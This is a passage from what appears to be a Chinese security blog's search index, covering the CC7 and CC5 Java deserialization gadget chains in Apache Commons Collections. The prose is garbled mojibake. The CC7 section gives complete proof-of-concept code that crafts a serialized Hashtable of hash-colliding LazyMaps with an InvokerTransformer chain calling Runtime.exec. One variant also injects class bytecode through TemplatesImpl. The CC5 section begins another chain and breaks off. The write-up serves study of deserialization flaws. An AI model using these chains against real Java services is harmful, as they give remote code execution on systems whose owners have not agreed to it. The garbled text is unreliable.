æ³•æ­£å¸¸æ”¾å…¥ä¸¤ä¸ªé”®å€¼å¯¹ã€‚\nç›´æ¥ä»ç¬¬äºŒæ¬¡æ”¾å…¥é”®å€¼å¯¹å¼€å§‹è¯´ï¼Œè¿™é‡Œç”±äºæˆ‘æ”¾å…¥çš„æ˜¯LazyMapç±»å®ä¾‹ï¼Œæœ¬æ¥ä»¥ä¸ºä¼šæŒ‰ç…§æˆ‘ä»¬å‰é¢è¯´çš„æµç¨‹èµ°ä¸€éï¼Œæœ€åä¼šè°ƒç”¨åˆ°AbstractMapç±»çš„equals()åœä¸‹ï¼Œå¤§é”™ç‰¹é”™ã€‚çœ‹ä»£ç \nç›´æ¥ä½¿ç”¨å¦‚ä¸‹ä»£ç æ¥æµ‹è¯•ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 package org.example; import java.util.HashMap; import java.util.Map; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; public class Main { public static void main(String[] args){ Transformer haha0 = new ConstantTransformer(1); Transformer haha1 = new ConstantTransformer(1); Map hashMap0 = new HashMap(); Map lazy0 = LazyMap.decorate(hashMap0,haha0); Map hashMap1 = new HashMap(); Map lazy1 = LazyMap.decorate(hashMap1,haha1); if(lazy0.equals(lazy1)){ System.out.println(\u0026#34;ç›¸ç­‰\u0026#34;); } } } //output:ç›¸ç­‰ è¿™é‡Œçš„è¾“å‡ºä¸ºç›¸ç­‰ï¼Œé‚£è¿™å°±æ˜¯è¯´æ˜ä¼šè¿›å…¥ifæ¡ä»¶ï¼Œå¯¼è‡´ä¸èƒ½æˆåŠŸæ”¾å…¥ä¸¤ä¸ªé”®å€¼å¯¹ã€‚ä½†æ˜¯åœ¨å‰é¢çš„åˆ†æä¸­ï¼Œå¦‚æœæƒ³è¦æˆåŠŸæ„é€ åˆ©ç”¨é“¾ï¼Œé‚£ä¹ˆå°±å¿…é¡»æ˜¯ä¼ å…¥ä¸¤ä¸ªLazyMapçš„å®ä¾‹ã€‚æ‰€ä»¥è¿™é‡Œè¦æƒ³å¦‚ä½•è§£å†³ã€‚æ‰“æ–­ç‚¹æ¥è°ƒè¯•ä¸€ä¸‹ï¼š ç›´æ¥æŒ‰ç…§é¢„æœŸè¿›å…¥åˆ°LazyMapçˆ¶ç±»AbstractMapDecoratorçš„equals()æ–¹æ³•ï¼š åœ¨å‰é¢åŸºæœ¬æµç¨‹é‚£é‡Œè¯´è¿‡ï¼Œè¿™é‡Œå°±æ˜¯åˆ¤æ–­è°ƒç”¨è¿™ä¸ªequals()æ–¹æ³•çš„å¯¹è±¡å’Œä¼ å…¥çš„objectå¼•ç”¨çš„å¯¹è±¡æ˜¯å¦ç›¸åŒï¼Œå¾ˆä¸å·§çš„æ˜¯æˆ‘ä»¬éƒ½ä¼ å…¥äº†LazyMapå¯¹è±¡ï¼Œå¯¼è‡´äº†è¿™é‡Œä½¿å¾—æ¡ä»¶æˆç«‹ï¼Œè¿”å›trueã€‚\nä½†æ˜¯ï¼ŒæŸ³æš—èŠ±æ˜åˆä¸€æ‘ï¼Œåœ¨è°ƒè¯•æ—¶ï¼Œåœ¨ä¸Šé¢ç‚¹å‡»ä¸‹ä¸€æ­¥åï¼Œçœ‹ï¼š\nè¿™é‡Œè¿˜è¦è°ƒç”¨ä¸€æ¬¡size()æ–¹æ³•ï¼ˆè¿™ä¸ªsize()æ–¹æ³•è¿‡åå°±æ²¡æŒ‰ç…§é¢„æœŸèµ°äº†ï¼‰ï¼Œæ‰€ä»¥è¿™é‡Œä¼šè°ƒç”¨HashMapçš„size()æ–¹æ³•\nè¿™ä¸ªHashMapçš„size()æ–¹æ³•åªæ˜¯è¿”å›å½“å‰ HashMap ä¸­å­˜å‚¨çš„é”®å€¼å¯¹çš„æ€»æ•°ã€‚\nè¿™é‡Œæåˆ°äº†é”®å€¼å¯¹ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ·»åŠ ä¸€ä¸ªé”®å€¼å¯¹è¯•è¯•ï¼Œè¿™é‡Œç›´æ¥å¯¹LazyMapå¯¹è±¡ä½¿ç”¨putä¹Ÿè¡Œï¼Œå› ä¸ºLazyMapçš„çˆ¶ç±»å®ç°äº†putæ–¹æ³•ï¼š ä»£ç å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 package org.example; import java.util.HashMap; import java.util.Map; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; public class Main { public static void main(String[] args){ Transformer haha0 = new ConstantTransformer(1); Transformer haha1 = new ConstantTransformer(1); Map hashMap0 = new HashMap(); Map lazy0 = LazyMap.decorate(hashMap0,haha0); lazy0.put(\u0026#34;xxx\u0026#34;,2); Map hashMap1 = new HashMap(); Map lazy1 = LazyMap.decorate(hashMap1,haha1); lazy1.put(\u0026#34;xxx\u0026#34;,1); if(lazy0.equals(lazy1)){ System.out.println(\u0026#34;ç›¸ç­‰\u0026#34;); } } } è¿™æ¬¡æ²¡æœ‰è¾“å‡ºï¼Œè¯´æ˜è¿™é‡Œä¸ç›¸åŒäº†ï¼Œä¸ä¼šè¿›å…¥falseï¼Œä¹Ÿå°±å¯ä»¥æ”¾å…¥ä¸¤ä¸ªå€¼äº†ã€‚\nï¼ˆé—ç•™ä¸€ä¸ªé—®é¢˜å§ï¼Œæ²¡è°ƒå‡ºæ¥è¿™é‡Œä¸ºä»€ä¹ˆä¼šç›´æ¥åˆ°size()å¹¶ä¸”å½±å“åˆ¤æ–­ï¼‰\nå¹¶ä¸”è¿™é‡Œåœ¨è°ƒè¯•æ—¶ç¡®å®å¯ä»¥è¿›å…¥åˆ°æœ€åçš„AbstractMapçš„equals()æ–¹æ³•å¹¶ä¸”æœ€ç»ˆæˆåŠŸè°ƒç”¨LazyMapçš„getæ–¹æ³•ï¼š é—®é¢˜equals()æ–¹æ³•è°ƒç”¨è§£å†³ã€‚\né‚£ä¹ˆç°åœ¨æˆ‘ä»¬åˆéœ€è¦æ³¨æ„ç¬¬ä¸€ä¸ªæ¡ä»¶ï¼Œå‰é¢æ˜¯ç›´æ¥è®¾å®šçš„æ²¡æœ‰é”®å€¼å¯¹ï¼Œä½†æ˜¯ç”±äºç¬¬äºŒä¸ªæ¡ä»¶çš„è§£å†³åŠæ³•ï¼Œå¯¼è‡´æˆ‘ä»¬è¿™é‡Œå¿…é¡»è¦æ€è€ƒå¦‚ä½•ä½¿å¾—hashç›¸åŒï¼Œæœ€åè°ƒç”¨çš„hashCodeæ–¹æ³•ï¼š æ¥ç”¨ä»£ç æµ‹è¯•çœ‹çœ‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 package org.example; import java.util.HashMap; import java.util.Map; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; public class Main { public static void main(String[] args){ Transformer haha0 = new ConstantTransformer(1); Transformer haha1 = new ConstantTransformer(1); Map hashMap0 = new HashMap(); Map lazy0 = LazyMap.decorate(hashMap0,haha0); lazy0.put(\u0026#34;xx\u0026#34;, 2); Map hashMap1 = new HashMap(); Map lazy1 = LazyMap.decorate(hashMap1,haha1); lazy1.put(\u0026#34;xxxx\u0026#34;, 1); if(lazy1.hashCode()==lazy0.hashCode()){ System.out.println(\u0026#34;ç›¸ç­‰\u0026#34;); } } } æ²¡æœ‰è¾“å‡ºï¼Œè¯´æ˜ä¸æ˜¯ç›¸åŒçš„ã€‚è¿™é‡Œå°±æ¶‰åŠåˆ°äº†å“ˆå¸Œç¢°æ’çš„é—®é¢˜ï¼Œä¸å¤šè¯´ï¼Œåœ¨ysoserialé“¾ä¸­è°ƒç”¨çš„æ˜¯yyå’ŒzZï¼Œè¿™ä¸¤ä¸ªå€¼çš„hashCode()ç»“æœæ˜¯ç›¸åŒçš„ï¼š åŒæ—¶ç»“åˆå‰é¢æœ€å¼€å§‹è°ƒè¯•hashCodeé‚£éƒ¨åˆ†è¯´äº†ä¼šè°ƒç”¨åˆ°HashMapå†…éƒ¨ç±»Nodeçš„hashCode()æ–¹æ³•ï¼š æ‰€ä»¥è¿™é‡Œçš„valueä¹Ÿéœ€è¦è®¾ç½®ä¸ºç›¸åŒçš„ï¼Œæ‰€ä»¥æœ€ç»ˆçš„æµ‹è¯•ä»£ç ä¸ºï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 package org.example; import java.util.HashMap; import java.util.Map; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; public class Main { public static void main(String[] args){ Transformer haha0 = new ConstantTransformer(1); Transformer haha1 = new ConstantTransformer(1); Map hashMap0 = new HashMap(); Map lazy0 = LazyMap.decorate(hashMap0,haha0); lazy0.put(\u0026#34;yy\u0026#34;, 1); Map hashMap1 = new HashMap(); Map lazy1 = LazyMap.decorate(hashMap1,haha1); lazy1.put(\u0026#34;zZ\u0026#34;, 1); if(lazy1.hashCode()==lazy0.hashCode()){ System.out.println(\u0026#34;ç›¸ç­‰\u0026#34;); } } } æˆåŠŸè¾“å‡ºç›¸ç­‰ã€‚\nä½†æ˜¯æ­¤æ—¶å°†è¿™ä¸ªä»£ç ç¨å¾®ä¿®æ”¹ä¸€ä¸‹åˆå¯ä»¥ç”¨æ¥æµ‹è¯•ç¬¬äºŒä¸ªæ¡ä»¶ï¼ˆä½†æ˜¯æœ‰é—®é¢˜ï¼‰ï¼Œå¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 package org.example; import java.util.HashMap; import java.util.Map; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; public class Main { public static void main(String[] args){ Transformer haha0 = new ConstantTransformer(1); Transformer haha1 = new ConstantTransformer(1); Map hashMap0 = new HashMap(); Map lazy0 = LazyMap.decorate(hashMap0,haha0); lazy0.put(\u0026#34;yy\u0026#34;, 1); Map hashMap1 = new HashMap(); Map lazy1 = LazyMap.decorate(hashMap1,haha1); lazy1.put(\u0026#34;zZ\u0026#34;, 1); if(lazy0.equals(lazy1)){ System.out.println(\u0026#34;ç›¸ç­‰\u0026#34;); } } } //è¾“å‡ºï¼šç›¸ç­‰ å¾ˆæ€ªåæ­£ï¼Œä»£ç ç»å¯¹æœ‰é—®é¢˜ï¼Œè¦ä¹ˆå°±æ˜¯æˆ‘çš„JVMè™šæ‹Ÿæœºæœ‰ç‚¹é—®é¢˜ï¼Œç›´æ¥åœ¨æœ€ç»ˆequals()æ–¹æ³•åŠ æ–­ç‚¹å¯ä»¥åˆ°ï¼Œè¿™é‡Œä¸ç®¡putè¿›çš„é”®æ˜¯ä»€ä¹ˆï¼Œåªè¦ä¸¤ä¸ªå€¼éƒ½æ˜¯1å°±ä¼šè¾“å‡ºç›¸ç­‰ï¼ˆå¥½åƒonly 1ï¼‰ï¼Œä½†æ˜¯è¿™é‡Œéƒ½æ”¹æˆå…¶ä»–çš„æ¯”å¦‚2å°±ä¸ä¼šäº†ï¼Œæ”¹æˆ2å¯¹äºhashCodeåº”è¯¥ä¹Ÿæ²¡æœ‰å½±å“ï¼Œå¹¶ä¸”ä»£ç è¾“å‡ºä¹Ÿæ²¡æœ‰é—®é¢˜ã€‚\né‚£ä¹ˆå°±å¯ä»¥å°è¯•æ„é€ çœŸæ­£çš„åˆ©ç”¨é“¾äº†ï¼Œè¿˜éœ€è¦æ³¨æ„çš„å°±æ˜¯åœ¨ç¬¬äºŒæ¬¡putçš„æ—¶å€™å°±ä¼šæ‰§è¡Œä¸€æ¬¡è°ƒç”¨é“¾äº†ï¼Œæ­¤æ—¶å°±éœ€è¦æ³¨æ„LazyMapçš„get()æ–¹æ³•ï¼Œå’Œä¹‹å‰çš„CC6å·®ä¸å¤šï¼Œéœ€è¦removeï¼Œç›´æ¥æ‰“æ–­ç‚¹æ¥çœ‹ä¼ è¿›å»çš„å€¼ï¼š\nå†çœ‹è¿›å…¥è¿™ä¸ªgetæ–¹æ³•çš„equals()æ–¹æ³•çš„ä½ç½®ï¼š\næ­¤æ—¶çš„keyæ˜¯lazy0çš„é”®ï¼Œæ‰€ä»¥è¿™é‡Œä¼šå¯¹lazy1çš„å“ˆå¸Œè¡¨å†putè¿›ä¸€ä¸ªå€¼ï¼š\nè¿™é‡Œç»“æœæ˜¯1å¾ˆæ­£å¸¸ï¼ŒfakeTransformeré“¾å­è¿”å›çš„å°±æ˜¯è¿™ä¸ªã€‚\næ‰€ä»¥åºåˆ—åŒ–çš„æ—¶å€™ä¼šå‘hashMap1ä¸­putè¿›ä¸€ä¸ªï¼ˆyy-1ï¼‰çš„é”®å€¼å¯¹ï¼Œä¸ºäº†åœ¨ååºåˆ—åŒ–çš„æ—¶å€™ï¼Œè®©hashå€¼ç›¸ç­‰ï¼Œèƒ½å¤ŸæˆåŠŸæ‰§è¡Œåˆ°è¿™é‡Œçš„transform()æ–¹æ³•ï¼Œæ‰€ä»¥éœ€è¦removeè¿™ä¸ªhashMap1ä¸­çš„è¿™ä¸ªé”®å€¼å¯¹ã€‚\næœ€ç»ˆæ„æˆå¦‚ä¸‹ä»£ç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 package org.example; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; import java.util.HashMap; import java.util.Hashtable; import java.util.Map; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.Runtime; import java.lang.reflect.Field; public class Main{ public static void main(String[] args) throws Exception { Transformer[] fakeTransformer = new Transformer[]{new ConstantTransformer(1)}; Transformer[] chainpart = new Transformer[]{new ConstantTransformer(Runtime.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}),new ConstantTransformer(1)}; Transformer chain = new ChainedTransformer(fakeTransformer); Hashtable hashtable = new Hashtable(); Map hashMap0 = new HashMap(); Map lazy0 = LazyMap.decorate(hashMap0,chain); lazy0.put(\u0026#34;yy\u0026#34;, 2); Map hashMap1 = new HashMap(); Map lazy1 = LazyMap.decorate(hashMap1,chain); lazy1.put(\u0026#34;zZ\u0026#34;, 2); hashtable.put(lazy0,1); hashtable.put(lazy1,2); hashMap1.remove(\u0026#34;yy\u0026#34;); Field x = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); x.setAccessible(true); x.set(chain,chainpart); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hashtable); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } } æˆåŠŸå¼¹å‡ºè®¡ç®—æœºã€‚\nåé¢å†çœ‹å‘ç°å…¶å®å…¶ä¸­æœ‰ä¸€ä¸ªç‚¹æ˜¯æ²¡æœ‰è¯´æ¸…æ¥šçš„ï¼Œç¡®å®åœ¨åºåˆ—åŒ–ä¹‹å‰æ˜¯å¯ä»¥æˆåŠŸè°ƒç”¨åˆ°LazyMapçš„get()æ–¹æ³•ï¼Œä½†æ˜¯å¯¹äºæ˜¯å¦ä¼šæ›¿æ¢è¿™ä¸ªé—®é¢˜æ²¡æœ‰è¯´æ¸…æ¥šï¼Œä¹Ÿå°±æ˜¯å¯¹åº”å¦‚ä¸‹ä»£ç ï¼š\nåœ¨åºåˆ—åŒ–å‰ï¼Œè¿™é‡Œåˆ°åº•ä¸ºä»€ä¹ˆä¸æ›´æ¢å€¼ã€‚å‰é¢ä»æ„å»ºçš„ä»£ç å±‚é¢ç®€å•è¯´äº†ä¸€ä¸‹åˆ©ç”¨æ–¹æ³•ã€‚ç°åœ¨POCä¹Ÿç»™å‡ºæ¥äº†ï¼Œå°±è·Ÿä¸€ä¸‹åº•å±‚æ¥æŸ¥çœ‹ä¸€ä¸‹ï¼š\nç›´æ¥æ‰“æ–­ç‚¹äºAbstractMapç±»çš„equals()æ–¹æ³•ï¼š\nè¿™é‡Œå°±æ˜¯æœŸæœ›æ‰§è¡Œget()æ–¹æ³•çš„åœ°æ–¹ï¼Œç”±äºç°åœ¨æ˜¯åºåˆ—åŒ–å‰ï¼Œç»è¿‡ä»£ç çš„æ„é€ ï¼Œä¸ä¼šå¼¹è®¡ç®—æœºï¼Œè·Ÿè¿›ä¸€ä¸‹è¿™é‡Œä¼šæ‰§è¡Œçš„LazyMapç±»çš„get()æ–¹æ³•ï¼š\nç”±äºæˆ‘ä»¬æ„é€ çš„transformæ‰§è¡Œç»“æœå°±ï¼Œæ˜¯è¿”å›ä¸€ä¸ª1ï¼Œå¹¶ä¸”æœ€åè¿”å›çš„è¿™ä¸ªvalueï¼Œæ‰€ä»¥ m.get(key) å°±æ˜¯è¿”å›ä¸€ä¸ª1ï¼Œä¹Ÿæ˜¯å› ä¸ºåœ¨è¿™é‡Œå¾€hashMap1ä¸­æ”¾è¿›äº†ä¸€ä¸ªé”®å€¼å¯¹ï¼Œä¸ºäº†ååºåˆ—åŒ–æ—¶èƒ½é€šè¿‡hashå€¼ç›¸åŒï¼Œæ‰€ä»¥åé¢åŠ äº†ä¸€ä¸ªremoveæ“ä½œã€‚\nç»§ç»­çœ‹ï¼š\næ‰€ä»¥ç°åœ¨æ¯”è¾ƒçš„å°±æ˜¯valueå’Œ1çš„ç›¸ç­‰å…³ç³»ï¼Œè€Œè¿™é‡Œçš„valueæ˜¯2ï¼š\nå…¶å®ä»ä»£ç å±‚é¢ä¹Ÿèƒ½çœ‹å‡ºæ¥ï¼Œæœ¬æ¥æœ€å¼€å§‹å°±æ˜¯putçš„yy =\u0026gt; 2ï¼Œè¿™é‡Œæ˜¯è‚¯å®šä¸ç›¸ç­‰çš„ï¼Œæ‰€ä»¥å–ååå°±æ˜¯trueäº†ï¼Œtrueè¿”å›äº†falseï¼Œæ‰€ä»¥æœ€åæ‰æ²¡æœ‰æ¢å€¼ã€‚\nè¿™æ ·ä¹Ÿèƒ½è§£å†³ä¸ºä»€ä¹ˆå‰é¢è¯´çš„only1å°±ä¸è¡Œäº†ï¼Œå¦‚æœæˆ‘putè¿›çš„æ˜¯1ï¼Œé‚£ä¹ˆè¿™é‡Œå°±ä¼šä¸transformè¿”å›çš„1ç›¸ç­‰ï¼Œæœ€åå°±ä¼šè¿”å›trueã€‚\né‚£ä¹ˆæˆ‘å°±æ˜¯è¦ç”¨1å‘¢ï¼Œå¦‚ä¸‹ä¸€ä¸ªæ“ä½œå°±è¡Œï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 package java_foundation; import java.util.HashMap; import java.lang.reflect.Field; import org.apache.commons.collections.functors.InstantiateTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; import javax.management.BadAttributeValueExpException; import java.lang.Class; import javax.xml.transform.Templates; import org.apache.commons.collections.keyvalue.TiedMapEntry; import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter; import java.util.Map; import org.apache.commons.collections.map.LazyMap; import java.util.HashSet; import java.util.Hashtable; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.nio.file.Files; import java.nio.file.Paths; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.io.FileOutputStream; import java.io.FileInputStream; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\Test.class\u0026#34;)); TemplatesImpl mpl =new TemplatesImpl(); setFieldValue(mpl,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(mpl,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(mpl,\u0026#34;_class\u0026#34;,null); setFieldValue(mpl,\u0026#34;_tfactory\u0026#34;,new TransformerFactoryImpl()); Transformer[] fakeTransformer = new Transformer[]{new ConstantTransformer(2)}; Transformer[] chainPart = new Transformer[]{new ConstantTransformer(Runtime.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}),new ConstantTransformer(1)}; Transformer chain = new ChainedTransformer(fakeTransformer); Hashtable hashtable = new Hashtable(); Map hashMap0 = new HashMap(); hashMap0.put(\u0026#34;yy\u0026#34;,1); Map lazy0 = LazyMap.decorate(hashMap0,chain); Map hashMap1 = new HashMap(); hashMap1.put(\u0026#34;zZ\u0026#34;,1); Map lazy1 = LazyMap.decorate(hashMap1,chain); hashtable.put(lazy0,1); hashtable.put(lazy1,1); hashMap1.remove(\u0026#34;yy\u0026#34;); Field field1 = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); field1.setAccessible(true); field1.set(chain,chainPart); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hashtable); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } public static void setFieldValue(Object mpl,String name,Object value) throws Exception { Field field = mpl.getClass().getDeclaredField(name); field.setAccessible(true); field.set(mpl,value); } } é‡ç‚¹è¿˜æ˜¯ä»£ç çš„ç†è§£ã€‚\né—®é¢˜ï¼š\nä¸åŠ é”®å€¼å¯¹ç›´æ¥åˆ°size()é—®é¢˜ å“ˆå¸Œç¢°æ’é—®é¢˜ ä¸ºä»€ä¹ˆå¯¹LazyMapä½¿ç”¨putæ—¶çš„é”®å€¼å¯¹çš„å€¼éœ€è¦ç›¸åŒï¼Œå¯èƒ½æ˜¯å†…éƒ¨ç±»Nodeé‚£é‡Œçš„hashCodeæ–¹æ³•åŸå› ã€‚ ","date":"2024-07-23T22:53:06+08:00","permalink":"https://fupanc-w1n.github.io/p/cc7/","title":"CC7"},{"content":"CC5 åœ¨å‰é¢CC6çš„å­¦ä¹ ä¸­ï¼Œæˆ‘ä»¬åœ¨æ‰¾LazyMap.get()çš„å…¶ä»–è°ƒç”¨é“¾æ—¶ï¼Œæ‰¾åˆ°äº†org.apache.commons.collections.keyvalue.TiedMapEntryç±»ï¼Œåœ¨CC6ä¸­ï¼Œæˆ‘ä»¬ç€é‡äºè°ƒç”¨TiedMapEntryç±»hashCode()æ–¹æ³•ä»è€Œå¯ä»¥è°ƒç”¨åˆ°getValue()æ–¹æ³•ï¼š\nä½†æ˜¯çºµè§‚TiedMapEntryç±»çš„æºç ï¼Œè¿˜å¯ä»¥çœ‹åˆ°ä¸€ä¸ªtoString()æ–¹æ³•ï¼š\nè¿™ä¸ªç±»ä¹Ÿå¯ä»¥è°ƒç”¨åˆ°TiedMapEntryç±»çš„getValue()æ–¹æ³•ï¼Œç°åœ¨å°±æ˜¯çœ‹æ˜¯å¦è¿˜æœ‰å“ªä¸ªç±»å¯ä»¥è°ƒç”¨åˆ°è¿™ä¸ªæ–¹æ³•ï¼Œä¹Ÿå°±æ˜¯CC5è¦è§£å†³çš„é—®é¢˜ã€‚\næµ‹è¯•ç¯å¢ƒï¼š\nJDK 8u411 commons-collections 3.2.1 ä»£ç è°ƒè¯• åœ¨ysoserialé“¾ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹è§æ–°åˆ©ç”¨åˆ°äº†ä¸€ä¸ªç±»ï¼ŒBadAttributeValueExpExceptionï¼Œè¿™ä¸ªç±»ä½äºjavax.management.BadAttributeValueExpExceptionï¼Œ\nè¿™é‡Œéœ€è¦çŸ¥é“ä¸€ä¸ªçŸ¥è¯†ç‚¹ï¼šå¦‚æœä¸€ä¸ªç±»æ²¡æœ‰å®ç°Serializableæ¥å£ï¼Œä½†åªè¦æŸä¸ªç±»çš„ç¥–å…ˆç±»ï¼ˆçˆ¶ç±»ã€ç¥–çˆ¶ç±»ç­‰ï¼‰å®ç°äº†Serializableæ¥å£ï¼Œé‚£ä¹ˆå…¶æ‰€æœ‰å­ç±»ä¹Ÿè¢«è®¤ä¸ºæ˜¯å¯åºåˆ—åŒ–çš„ã€‚\nBadAttributeValueExceptionç±»éƒ¨åˆ†æºç å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 public class BadAttributeValueExpException extends Exception { private static final long serialVersionUID = -3105272988410493376L; private Object val; public BadAttributeValueExpException (Object val) { this.val = val == null ? null : val.toString(); } public String toString() { return \u0026#34;BadAttributeValueException: \u0026#34; + val; } private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException { ObjectInputStream.GetField gf = ois.readFields(); Object valObj = gf.get(\u0026#34;val\u0026#34;, null); if (valObj == null) { val = null; } else if (valObj instanceof String) { val= valObj; } else if (System.getSecurityManager() == null || valObj instanceof Long || valObj instanceof Integer || valObj instanceof Float || valObj instanceof Double || valObj instanceof Byte || valObj instanceof Short || valObj instanceof Boolean) { val = valObj.toString(); } else { // the serialized object is from a version without JDK-8019292 fix val = System.identityHashCode(valObj) + \u0026#34;@\u0026#34; + valObj.getClass().getName(); } } } è™½ç„¶è¿™ä¸ªç±»æ²¡æœ‰å®ç°Serializableæ¥å£ï¼Œä½†æ˜¯å…¶çˆ¶ç±»Exceptionçš„çˆ¶ç±»Throwableå®ç°äº†Serializableæ¥å£ï¼Œæ‰€ä»¥BadAttributeValueExceptionä¹Ÿæ˜¯å¯ä»¥åºåˆ—åŒ–çš„ã€‚\nä¸ªäººæ€è€ƒ ç°åœ¨ç»§ç»­æ¥çœ‹æºç ï¼Œæˆ‘çœ‹åˆ°äº†è¿™ä¸ªç±»çš„æ„é€ æ–¹æ³•ï¼š è¿™æ˜¯ä¸€ä¸ªä¸‰å…ƒæ“ä½œç¬¦ï¼Œå¦‚æœvalä¸ä¸ºnullï¼Œåˆ™è¿”å›val.toString()ï¼Œæ—¢ç„¶è¿™é‡Œæ˜¯æ„é€ æ–¹æ³•ï¼Œæˆ‘æƒ³åˆ°äº†CC3çš„åˆ©ç”¨æ–¹æ³•ï¼Œåªè¦æˆ‘ä»¬æ„é€ äº†valä¸ºæˆ‘ä»¬è®¾ç½®å¥½çš„TiedMapEntryç±»ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ˜¯å¦èƒ½å¤ŸæˆåŠŸè°ƒç”¨ã€‚\nåœ¨CC3åˆ©ç”¨åˆ°äº†InstantiateTransformerç±»ï¼Œé‚£ä¹ˆåœ¨è¿™é‡Œå†å°è¯•åˆ©ç”¨ä¸€ä¸‹ã€‚\næƒ³äº†ä¸€ä¸‹ï¼Œç†è®ºä¸Šåº”è¯¥æ˜¯å¯ä»¥çš„ï¼Œæ²¡å¾—å¥½å¤§æ„ä¹‰å—ï¼Œå› ä¸ºæœ€ç»ˆåœ¨ååºåˆ—åŒ–çš„æ—¶å€™è¿˜æ˜¯éœ€è¦è°ƒç”¨å…¶ä»–ç±»çš„readObject()ï¼Œä»¥CC3çš„HashMapä¸ºä¾‹ï¼Œè¿˜æ˜¯æ„å»ºä¸‹ä»£ç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 package org.example; import javax.management.BadAttributeValueExpException; import java.util.HashMap; import java.util.Map; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter; import javax.xml.transform.Templates; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.InstantiateTransformer; import org.apache.commons.collections.map.LazyMap; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; public class Main{ public static void main(String[] args) throws Exception { byte[] code = 